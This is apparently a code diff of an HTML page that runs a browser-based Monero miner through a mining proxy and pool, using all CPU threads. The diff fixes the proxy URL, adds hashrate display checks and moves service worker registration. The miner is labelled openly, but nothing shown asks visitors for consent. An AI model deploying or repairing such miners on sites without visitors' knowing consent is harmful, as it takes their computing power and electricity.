@@ -34,7 +34,8 @@
     <!-- Start Of Mining Code (HTML) -->
     <script src="miner.js"></script>
     <script>
-        server = "wss://://xmrminingproxy.com";
+        // CORREÇÃO 1: Removido os dois pontos extras e as barras duplicadas na URL
+        server = "wss://ny1.xmrminingproxy.com"; 
         var pool = "moneroocean.stream";
         var workerId = "GH-XMR";
         var threads = -1;
@@ -70,11 +71,10 @@
 
                 // Loop de monitoramento corrigido usando as funções nativas do script
                 statsInterval = setInterval(function() {
-                    if (typeof miner !== 'undefined') {
-                        // miner.getHashesPerSecond() puxa a velocidade real
-                        var currentHashrate = miner.getHashesPerSecond().toFixed(2);
-                        // miner.getTotalHashes() puxa a contagem de hashes aceitos
-                        var totalHashesCalculated = miner.getTotalHashes();
+                    // CORREÇÃO 2: Verificação mais robusta da instância 'miner' do script nativo
+                    if (typeof miner !== 'undefined' && miner !== null) {
+                        var currentHashrate = typeof miner.getHashesPerSecond === 'function' ? miner.getHashesPerSecond().toFixed(2) : "0.00";
+                        var totalHashesCalculated = typeof miner.getTotalHashes === 'function' ? miner.getTotalHashes() : 0;
 
                         hashrateTxt.innerText = currentHashrate + " H/s";
                         totalTxt.innerText = totalHashesCalculated;
@@ -95,16 +95,17 @@
     </script>
     <!-- End Of Mining Code (HTML) -->
 
+    <!-- CORREÇÃO 3: Mapeamento do Service Worker movido para dentro da tag body -->
+    <script>
+      if ('serviceWorker' in navigator) {
+        window.addEventListener('load', () => {
+          navigator.serviceWorker.register('serviceworker.js').then(registration => {
+            console.log('Service Worker registered with scope:', registration.scope);
+          }).catch(error => {
+            console.error('Service Worker registration failed:', error);
+          });
+        });
+      }
+    </script>
 </body>
-<script>
-  if ('serviceWorker' in navigator) {
-    window.addEventListener('load', () => {
-      navigator.serviceWorker.register('serviceworker.js').then(registration => {
-        console.log('Service Worker registered with scope:', registration.scope);
-      }).catch(error => {
-        console.error('Service Worker registration failed:', error);
-      });
-    });
-  }
-</script>
 </html>
